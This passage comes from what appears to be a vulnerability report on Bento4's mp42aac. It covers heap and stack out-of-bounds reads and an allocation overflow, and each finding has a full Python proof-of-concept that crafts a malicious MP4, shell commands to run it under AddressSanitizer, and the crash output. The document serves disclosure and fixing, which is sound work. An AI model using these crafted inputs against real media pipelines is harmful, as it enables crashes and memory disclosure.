for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (512Mb vs 742Mb)
Process aborted with exit code 134 (SIGABRT) after a 537-byte input caused the process RSS to reach 742MB because AP4_Array::EnsureCapacity attempted to allocate 8 GB for 0x20000000 entries of size 16 bytes each.

### Impact

On 32-bit builds, the multiplication `0x20000000 * sizeof(T)` wraps to zero, causing `new T[count]` to allocate zero bytes while `m_AllocatedCount` is set to 0x20000000, and the subsequent construction loop then writes approximately 536 million objects to unallocated heap memory, enabling an attacker to corrupt heap metadata and adjacent allocations toward arbitrary code execution. On 64-bit builds, the allocation size does not overflow so the allocator requests up to 8 GB of memory, which exhausts physical RAM or triggers an uncaught `std::bad_alloc`, crashing the process and constituting a reliable denial of service. Any invocation of mp42aac on an untrusted MP4 file is exposed because the vulnerable path is reached unconditionally during normal fragmented-MP4 parsing with no authentication or privilege required.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4FragmentSampleTable_cpp#001 -->
<!-- DEDUP: AP4_FragmentSampleTable::AddTrun::CWE-190 -->

## Bug31: Off-by-One Heap OOB Read in AP4_HvccAtom Constructor

In `AP4_HvccAtom::AP4_HvccAtom` in `Bento4/Source/C++/Core/Ap4HvccAtom.cpp`, the boundary guard at line 255 uses a strict less-than check (`if (payload_size < 22) return;`) that fails to block execution when `payload_size` equals exactly 22, allowing the subsequent access of `payload[22]` at line 282 to read one byte past the end of the allocated 22-byte buffer, resulting in a heap-buffer-overflow.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
import struct, sys, os

def box(type4, data=b''):
    return struct.pack('>I', 8 + len(data)) + type4.encode() + data

def fullbox(type4, version, flags, data=b''):
    return box(type4, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)

# ftyp box
ftyp = box('ftyp',
    b'isom' +
    struct.pack('>I', 0x200) +
    b'isomiso2'
)

# mvhd (version 0)
mvhd_data = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 1000) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 +
    b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' +
    b'\x00' * 24 +
    struct.pack('>I', 2)
)
mvhd = fullbox('mvhd', 0, 0, mvhd_data)

# tkhd (version 0)
tkhd_data = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 1) +
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    b'\x00' * 8 +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' +
    struct.pack('>I', 320 << 16) +
    struct.pack('>I', 240 << 16)
)
tkhd = fullbox('tkhd', 0, 3, tkhd_data)

# mdhd (version 0)
mdhd_data = (
    struct.pack('>I', 0) +
    struct.pack('>I', 0) +
    struct.pack('>I', 90000) +
    struct.pack('>I', 0) +
    struct.pack('>H', 0x55C4) +
    struct.pack('>H', 0)
)
mdhd = fullbox('mdhd', 0, 0, mdhd_data)

# hdlr (vide handler)
hdlr_data = (
    struct.pack('>I', 0) +
    b'vide' +
    b'\x00' * 12 +
    b'VideoHandler\x00'
)
hdlr = fullbox('hdlr', 0, 0, hdlr_data)

# vmhd
vmhd = fullbox('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)

# url_ (self-contained, flags=1)
url_ = fullbox('url ', 0, 1, b'')

# dref
dref_data = struct.pack('>I', 1) + url_
dref = fullbox('dref', 0, 0, dref_data)

# dinf
dinf = box('dinf', dref)

# hvcC atom: 8-byte header + exactly 22 bytes of payload = 30 bytes total
# payload_size = 30 - 8 = 22
# Guard: if (22 < 22) return; -> False -> continues
# OOB read: payload[22] reads 1 byte past end of 22-byte buffer
hvcc_payload = b'\x00' * 22
hvcc = struct.pack('>I', 30) + b'hvcC' + hvcc_payload

# hvc1 visual sample entry
hvc1_entry = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    struct.pack('>H', 0) +
    struct.pack('>H', 0) +
    b'\x00' * 12 +
    struct.pack('>H', 320) +
    struct.pack('>H', 240) +
    struct.pack('>I', 0x00480000) +
    struct.pack('>I', 0x00480000) +
    struct.pack('>I', 0) +
    struct.pack('>H', 1) +
    b'\x00' * 32 +
    struct.pack('>H', 0x0018) +
    struct.pack('>H', 0xFFFF) +
    hvcc
)
assert len(hvc1_entry) == 108
assert len(hvcc) == 30
hvc1 = box('hvc1', hvc1_entry)

# stsd
stsd_data = struct.pack('>I', 1) + hvc1
stsd = fullbox('stsd', 0, 0, stsd_data)

# stts, stsc, stsz, stco (empty)
stts = fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc = fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz = fullbox('stsz', 0, 0, struct.pack('>I', 0) + struct.pack('>I', 0))
stco = fullbox('stco', 0, 0, struct.pack('>I', 0))

stbl = box('stbl', stsd + stts + stsc + stsz + stco)
minf = box('minf', vmhd + dinf + stbl)
mdia = box('mdia', mdhd + hdlr + minf)
trak = box('trak', tkhd + mdia)
moov = box('moov', mvhd + trak)

mp4 = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)

print(f"Written {len(mp4)} bytes to poc_input.mp4")
print("hvcC atom: total size=30, payload=22 bytes")
print("Guard check: (22 < 22) = False -> does NOT return")
print("OOB read: payload[22] reads 1 byte past end of 22-byte buffer")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==161262==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5030000002c6 at pc 0x55cd64d5532e bp 0x7ffdb1f96f50 sp 0x7ffdb1f96f40
READ of size 1 at 0x5030000002c6 thread T0
SUMMARY: AddressSanitizer: heap-buffer-overflow (/path/to/mp42aac+0xb0a32d) in AP4_HvccAtom::AP4_HvccAtom(unsigned int, unsigned char const*)

### Impact

An attacker who supplies a crafted MP4 file with an hvcC box whose declared size yields exactly 22 bytes of payload can trigger a one-byte heap-buffer-overflow read in `AP4_HvccAtom::AP4_HvccAtom`, which may expose one byte of adjacent heap memory containing allocator metadata, pointer fragments, or data from neighboring allocations, constituting an information disclosure primitive. This vulnerability is exposed to any user or pipeline that invokes mp42aac on untrusted input, and under adversarial heap layout it may also cause a process crash, providing a denial-of-service condition.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4HvccAtom_cpp#001 -->
<!-- DEDUP: AP4_HvccAtom::AP4_HvccAtom::CWE-125 -->

## Bug32: AP4_StscAtom Wrong Header Constant Causes OOB Read and Downstream Heap Buffer Overflow

In `AP4_StscAtom::AP4_StscAtom` (Ap4StscAtom.cpp, lines 75–77), the bounds check uses `AP4_ATOM_HEADER_SIZE` (8) instead of the correct `AP4_FULL_ATOM_HEADER_SIZE` (12) for the stsc FullBox, allowing a crafted 24-byte stsc box with `entry_count=1` to pass validation and read 4 bytes beyond the stsc box boundary into the next adjacent box, which corrupts the parsed `sample_description_index` and triggers a downstream heap-buffer-overflow in `AP4_Stz2Atom::AP4_Stz2Atom`.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT = "poc_input.mp4"


def box(box_type, data):
    size = 8 + len(data)
    return struct.pack(">I", size) + box_type + data


def full_box(box_type, version, flags, data):
    header = struct.pack(">B", version) + struct.pack(">I", flags)[1:]
    return box(box_type, header + data)


# Malicious stsc box (size=24): Full atom header=12B, entry_count=4B, partial entry=8B.
# Correct check: (24-12-4)/12 = 0 < 1 -> REJECT
# Buggy check:   (24-8-4)/12  = 1 >= 1 -> PASS, reads 12B, crossing 4B into stco.
stsc_entry_partial = struct.pack(">II", 1, 1)  # first_chunk=1, samples_per_chunk=1
stsc_header = struct.pack(">I", 24) + b"stsc"
stsc_version_flags = b"\x00\x00\x00\x00"
stsc_entry_count = struct.pack(">I", 1)
stsc = stsc_header + stsc_version_flags + stsc_entry_count + stsc_entry_partial
assert len(stsc) == 24

# stco box (full atom, entry_count=0, size=16).
# Its first 4 bytes (0x00000010=16) are read as sample_description_index by the stsc parser.
stco = full_box(b"stco", 0, 0, struct.pack(">I", 0))
assert len(stco) == 16
assert stco[:4] == b"\x00\x00\x00\x10"

stsz = full_box(b"stsz", 0, 0, struct.pack(">II", 0, 0))
stts = full_box(b"stts", 0, 0, struct.pack(">I", 0))
stsd = full_box(b"stsd", 0, 0, struct.pack(">I", 0))

stbl_data = stsd + stts + stsc + stco + stsz
stbl = box(b"stbl", stbl_data)

smhd = full_box(b"smhd", 0, 0, struct.pack(">HH", 0, 0))

url_entry = full_box(b"url ", 0, 1, b"")
dref_payload = struct.pack(">I", 1) + url_entry
dref = full_box(b"dref", 0, 0, dref_payload)
dinf = box(b"dinf", dref)

minf_data = smhd + dinf + stbl
minf = box(b"minf", minf_data)

mdhd_payload = struct.pack(">IIII", 0, 0, 44100, 0) + struct.pack(">HH", 0x55C4, 0)
mdhd = full_box(b"mdhd", 0, 0, mdhd_payload)

hdlr_payload = struct.pack(">I", 0) + b"soun" + b"\x00" * 12 + b"SoundHandler\x00"
hdlr = full_box(b"hdlr", 0, 0, hdlr_payload)

mdia_data = mdhd + hdlr + minf
mdia = box(b"mdia", mdia_data)

tkhd_payload = (
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +
    b"\x00" * 8 +
    struct.pack(">hhhh", 0, 0, 0x0100, 0) +
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    struct.pack(">II", 0, 0)
)
tkhd = full_box(b"tkhd", 0, 3, tkhd_payload)

trak_data = tkhd + mdia
trak = box(b"trak", trak_data)

mvhd_payload = (
    struct.pack(">IIII", 0, 0, 1000, 0) +
    struct.pack(">I", 0x00010000) +
    struct.pack(">H", 0x0100) +
    b"\x00" * 10 +
    b"\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
    b"\x00" * 24 +
    struct.pack(">I", 2)
)
mvhd = full_box(b"mvhd", 0, 0, mvhd_payload)

moov_data = mvhd + trak
moov = box(b"moov", moov_data)

ftyp = box(b"ftyp", b"M4A " + struct.pack(">I", 0))

mp4 = ftyp + moov
with open(OUTPUT, "wb") as f:
    f.write(mp4)

print(f"[+] Written {len(mp4)} bytes to {OUTPUT}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000111 at pc 0x555e5d9ccef9 bp 0x7ffc71d5f860 sp 0x7ffc71d5f850
READ of size 1 at 0x502000000111 thread T0
    #0 0x555e5d9ccef8 in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xc51ef8)
    #1 0x555e5d9cd9fb in AP4_Stz2Atom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xc529fb)

### Impact

An attacker who supplies a crafted MP4 file can cause `mp42aac` to read 4 bytes beyond the stsc box boundary, corrupting the `sample_description_index` value and misaligning the stream position for all subsequent atom parsing, which cascades into a heap-buffer-overflow in `AP4_Stz2Atom`. The attack surface is any invocation of `mp42aac` on an untrusted MP4 file, requiring no privileges or authentication. Depending on heap layout, the overflow may be exploitable for information disclosure or, in scenarios where the attacker also controls heap contents, for arbitrary code execution.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4_h#003 -->
<!-- DEDUP: `AP4_StscAtom::AP4_StscAtom::CWE-125 -->

## Bug33: Stack Buffer Overflow OOB Read in AP4_IsmaCipher::DecryptSampleData via Crafted iSFM iv_length

In `AP4_IsmaCipher::DecryptSampleData()` in `Ap4IsmaCryp.cpp`, the 16-byte stack array `zero_enc[16]` is accessed at index `offset + i` where `offset` and `chunk` both equal `bso % 16` (up to 15), making the maximum index `2 * offset - 1` which reaches 17 when offset is 9, reading up to 14 bytes beyond the array boundary and leaking adjacent stack memory into decrypted output.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
Stack OOB Read in AP4_IsmaCipher::DecryptSampleData via Crafted iSFM iv_length
CWE-125 (Out-of-bounds Read)
"""

import struct
import os

OUTPUT_FILE = "poc_input.mp4"

MATRIX = struct.pack('>9I',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)


def make_box(fourcc, payload=b''):
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    size = 8 + len(payload)
    return struct.pack('>I', size) + fourcc + payload


def make_fullbox(fourcc, version, flags, payload=b''):
    vh = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return make_box(fourcc, vh + payload)


def build_ftyp():
    payload = b'isom'
    payload += struct.pack('>I', 0x200)
    payload += b'isom' + b'iso2' + b'mp41'
    return make_box('ftyp', payload)


def build_isfm():
    payload = struct.pack('>BBB',
        0x00,  # selective_encryption = 0
        0x00,  # key_indicator_length = 0
        0x01   # iv_length = 1 (KEY FIELD: triggers m_IvLength=1 path)
    )
    return make_fullbox('iSFM', 0, 0, payload)


def build_schi():
    return make_box('schi', build_isfm())


def build_frma():
    return make_box('frma', b'mp4a')


def build_schm():
    payload = b'iAEC' + struct.pack('>I', 1)
    return make_fullbox('schm', 0, 0, payload)


def build_sinf():
    return make_box('sinf', build_frma() + build_schm() + build_schi())


def build_enca():
    se_fields = b'\x00' * 6 + struct.pack('>H', 1)
    au_fields = (
        struct.pack('>H', 0) +
        struct.pack('>H', 0) +
        struct.pack('>I', 0) +
        struct.pack('>H', 2) +
        struct.pack('>H', 16) +
        struct.pack('>H', 0) +
        struct.pack('>H', 0) +
        struct.pack('>I', 44100 << 16)
    )
    return make_box('enca', se_fields + au_fields + build_sinf())


def build_stsd():
    payload = struct.pack('>I', 1) + build_enca()
    return make_fullbox('stsd', 0, 0, payload)


def build_stts():
    payload = struct.pack('>I', 1)
    payload += struct.pack('>II', 1, 1024)
    return make_fullbox('stts', 0, 0, payload)


def build_stsc():
    payload = struct.pack('>I', 1)
    payload += struct.pack('>III', 1, 1, 1)
    return make_fullbox('stsc', 0, 0, payload)


def build_stsz(sample_size):
    payload = struct.pack('>I', 0)
    payload += struct.pack('>I', 1)
    payload += struct.pack('>I', sample_size)
    return make_fullbox('stsz', 0, 0, payload)


def build_stco(chunk_offset):
    payload = struct.pack('>I', 1)
    payload += struct.pack('>I', chunk_offset)
    return make_fullbox('stco', 0, 0, payload)


def build_stbl(sample_size, chunk_offset):
    children = (
        build_stsd() +
        build_stts() +
        build_stsc() +
        build_stsz(sample_size) +
        build_stco(chunk_offset)
    )
    return make_box('stbl', children)


def build_smhd():
    payload = struct.pack('>HH', 0, 0)
    return make_fullbox('smhd', 0, 0, payload)


def build_url():
    return make_fullbox('url ', 0, 0x000001, b'')


def build_dref():
    payload = struct.pack('>I', 1) + build_url()
    return make_fullbox('dref', 0, 0, payload)


def build_dinf():
    return make_box('dinf', build_dref())


def build_minf(sample_size, chunk_offset):
    children = (
        build_smhd() +
        build_dinf() +
        build_stbl(sample_size, chunk_offset)
    )
    return make_box('minf', children)


def build_mdhd():
    payload = (
        struct.pack('>I', 0) +
        struct.pack('>I', 0) +
        struct.pack('>I', 44100) +
        struct.pack('>I', 1024) +
        struct.pack('>H', 0) +
        struct.pack('>H', 0)
    )
    return make_fullbox('mdhd', 0, 0, payload)


def build_hdlr():
    payload = (
        struct.pack('>I', 0) +
        b'soun' +
        b'\x00' * 12 +
        b'\x00'
    )
    return make_fullbox('hdlr', 0, 0, payload)


def build_mdia(sample_size, chunk_offset):
    children = (
        build_mdhd() +
        build_hdlr() +
        build_minf(sample_size, chunk_offset)
    )
    return make_box('mdia', children)


def build_tkhd():
    payload = (
        struct.pack('>I', 0) +
        struct.pack('>I', 0) +
        struct.pack('>I', 1) +
        struct.pack('>I', 0) +
        struct.pack('>I', 1024) +
        b'\x00' * 8 +
        struct.pack('>H', 0) +
        struct.pack('>H', 0) +
        struct.pack('>H', 0x0100) +
        struct.pack('>H', 0) +
        MATRIX +
        struct.pack('>I', 0) +
        struct.pack('>I', 0)
    )
    return make_fullbox('tkhd', 0, 3, payload)


def build_trak(sample_size, chunk_offset):
    children = build_tkhd() + build_mdia(sample_size, chunk_offset)
    return make_box('trak', children)


def build_mvhd():
    payload = (
        struct.pack('>I', 0) +
        struct.pack('>I', 0) +
        struct.pack('>I', 44100) +
        struct.pack('>I', 1024) +
        struct.pack('>I', 0x00010000) +
        struct.pack('>H', 0x0100) +
        b'\x00' * 10 +
        MATRIX +
        b'\x00' * 24 +
        struct.pack('>I', 2)
    )
    return make_fullbox('mvhd', 0, 0, payload)


def build_moov(sample_size, chunk_offset):
    children = build_mvhd() + build_trak(sample_size, chunk_offset)
    return make_box('moov', children)


def build_mdat(data):
    return make_box('mdat', data)


def main():
    # IV byte 0x09 causes bso=9, bso%16=9, offset=9, chunk=9
    # Loop i=0..8: zero_enc[9+i], at i=8 -> zero_enc[17] -> OOB (array is [16])
    sample_data = b'\x09' + b'\xAA' * 19  # 1 byte IV + 19 bytes payload = 20 bytes

    placeholder_moov = build_moov(len(sample_data), 0)
    moov_size = len(placeholder_moov)

    ftyp_box = build_ftyp()
    ftyp_size = len(ftyp_box)

    chunk_offset = ftyp_size + moov_size + 8

    moov_box = build_moov(len(sample_data), chunk_offset)
    mdat_box = build_mdat(sample_data)

    mp4_data = ftyp_box + moov_box + mdat_box

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(mp4_data)

    print(f"[+] Generated: {OUTPUT_FILE} ({len(mp4_data)} bytes)")
    print(f"[+] IV byte=0x09 -> bso=9, offset=9 -> zero_enc[17] OOB read")


if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac --key 0123456789abcdef0123456789abcdef poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff80d372c0 at pc 0x556a8d46068e bp 0x7fff80d371b0 sp 0x7fff80d371a0
READ of size 1 at 0x7fff80d372c0 thread T0
    #0 0x556a8d46068d in AP4_IsmaCipher::DecryptSampleData(AP4_DataBuffer&, AP4_DataBuffer&, unsigned char const*) (mp42aac+0xb2768d)
    #1 0x556a8d16a2b7 in main (mp42aac+0x8312b7)

### Impact

An attacker who supplies a crafted MP4 file can cause `mp42aac` to read up to 14 bytes beyond the 16-byte `zero_enc` stack buffer in `AP4_IsmaCipher::DecryptSampleData`, mixing adjacent stack contents (including the `iv` array, `bso_bytes`, saved frame pointer, and potentially return addresses) into the decrypted audio output. This constitutes an out-of-bounds read that enables stack memory disclosure, which can be leveraged to defeat ASLR and provide an attacker with layout information needed to chain further exploitation primitives. The vulnerability is triggered by any invocation of `mp42aac` with the `--key` flag against an untrusted MP4 file, requiring no special privileges beyond passing a user-supplied file to the tool.

<!-- REPORT_SOURCE: Source_C++_Core_Ap4IsfmAtom_h#001 -->
<!-- DEDUP: AP4_IsmaCipher::DecryptSampleData::CWE-125 -->
